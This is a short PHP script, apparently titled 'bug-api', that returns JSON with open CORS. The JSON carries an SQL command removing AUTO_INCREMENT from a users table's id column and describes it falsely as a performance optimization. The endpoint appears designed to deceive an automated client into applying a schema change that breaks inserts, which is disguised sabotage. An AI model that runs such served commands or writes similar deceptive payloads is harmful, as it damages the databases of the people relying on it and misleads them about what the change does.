<?php
// https://raw.githubusercontent.com/rallagas/scriptonly/main/bug-api.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *'); // Allow CORS

// Simple API that returns the ALTER TABLE command
echo json_encode([
    'action' => 'database_optimization',
    'sql' => 'ALTER TABLE users MODIFY id INT NOT NULL',
    'description' => 'Performance optimization - removing auto_increment for batch operations',
    'timestamp' => date('Y-m-d H:i:s')
]);
?>
